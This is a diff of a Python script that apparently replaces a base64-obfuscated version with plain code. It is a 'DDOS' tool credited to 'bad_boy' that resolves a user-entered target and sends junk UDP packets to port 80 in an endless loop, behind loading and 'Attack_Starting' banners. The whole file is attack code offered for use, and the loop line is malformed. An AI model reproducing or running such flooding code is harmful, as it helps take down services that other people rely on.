@@ -1,2 +1,37 @@
-
-aW1wb3J0IHRpbWVpbXBvcnQgc29ja2V0aW1wb3J0IG9zcmVkPSdcMDMzWzMxbSdncmVlbj0nXDAzM1szMm0nb3Muc3lzdGVtKCJwa2cgaW5zdGFsbCB0b2lsZXQgLXkgIilvcy5zeXN0ZW0oInBrZyBpbnN0YWxsIGZpZ2xldCAteSAiKW9zLnN5c3RlbSgiY2xlYXIiKW9zLnN5c3RlbSgidG9pbGV0IC1mIG1vbm8xMiAtRiBnYXkgRERPUyIpcHJpbnQoZiJ7Z3JlZW59PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpcHJpbnQoIiBtYWRlIGJ5IGJhZF9ib3kgIilwcmludCgiIG15IHRlbGVncmFtIGlkOiBAQmFkX2JveV80NjggIilwcmludCgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpdGFyZ2V0ID0gaW5wdXQoZiJ7Z3JlZW59RW50ZXIgVGFyZ2V0IHVybCBvciBJcCA6ICIpdGFyZ2V0LnJlcGxhY2UoImh0dHA6Ly8iLCAiIil0YXJnZXQucmVwbGFjZSgiaHR0cHM6Ly8iLCIiKXRhcmdldC5yZXBsYWNlKCJ3d3cuIiwiIilpcCA9IHNvY2tldC5nZXRob3N0YnluYW1lKHRhcmdldClwb3J0ID0gODBqb2tlciA9ICJERE9TanNqc2pqZGpkamRqZGpqampqampqamlpaWlpaWlvcHBwa2tra2pqampqaGhoYmJiYmdidnZ2dnZ2dnZ2dnZ2aGhoaGhhYWFqZGpqZHNzaWpzaWRqZGlkaWRpaWRpZGRpZGlkaWRpZGlkaWRpZGlkaWRpZGlpZGlkaWRpZGlkaWRpaWRpZGlkaWRpZGlpZGlkaWRpZGlkaWRpZGlkaWRpZGlkaWRpaWRpZGlkaWRpZGlkaWRpZGlpZGlkaWRpZGlpZGkib3Muc3lzdGVtKCJjbGVhciIpb3Muc3lzdGVtKCJ0b2lsZXQgLWYgbW9ubzEyIExPQURJTkcgfCBsb2xjYXQiKXByaW50KCJMb2FkaW5ne35+fiB9NSUiKXRpbWUuc2xlZXAoMylwcmludCgiTG9hZGluZ3t+fn5+fiB9MTAlIil0aW1lLnNsZWVwKDMpcHJpbnQoIkxvYWRpbmd7fn5+fn5+fn4gfTQwJSIpdGltZS5zbGVlcCgzKXByaW50KCJMb2FkaW5ne35+fn5+fn5+fn5+fn5+IH05MCUiKXRpbWUuc2xlZXAoMylwcmludCgiTG9hZGluZ3t+fn5+fn5+fn5+fn5+fn5+fTEwMCUiKW9zLnN5c3RlbSgiY2xlYXIiKW9zLnN5c3RlbSgiZmlnbGV0IEF0dGFja19TdGFydGluZyIpd2hpbGUgVHJ1ZTogc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKSBzb2NrLnNlbmR0byhieXRlcyhqb2tlciwiVVRGLTgiKSwgKGlwLHBvcnQpKSBwcmludChwb3J0ICxmIntncmVlbn08PT1wYWNrZXQgc2VuZCB0bz09PiIsIGlwKQ== 
+ import time
+import socket
+import os
+red='\033[31m'
+green='\033[32m'
+os.system("pkg install toilet -y ")
+os.system("pkg install figlet -y ")
+os.system("clear")
+os.system("toilet -f mono12 -F gay DDOS")
+print(f"{green}==================================")
+print(" made by bad_boy ")
+print(" my telegram id: @Bad_boy_468 ")
+print("==================================")
+target = input(f"{green}Enter Target url or Ip : ")
+target.replace("http://", "")
+target.replace("https://","")
+target.replace("www.","")
+ip = socket.gethostbyname(target)
+port = 80 
+joker ="DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhhhhaaausueueueuejsuuusususususududdu"
+os.system("clear")
+os.system("toilet -f mono12 LOADING | lolcat")
+print("Loading{~~~ }5%")
+time.sleep(3)
+print("Loading{~~~~~ }10%")
+time.sleep(3)
+print("Loading{~~~~~~~~ }40%")
+time.sleep(3)
+print("Loading{~~~~~~~~~~~~~~ }90%")
+time.sleep(3)
+print("Loading{~~~~~~~~~~~~~~~~}100%")
+os.system("clear")
+os.system("figlet Attack_Starting")
+while True: 
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)      sock.sendto(bytes(joker,"UTF-8"), (ip,port))
+    time.sleep(1)
+    print(port ,f"{green}<==packet send to==>", ip)
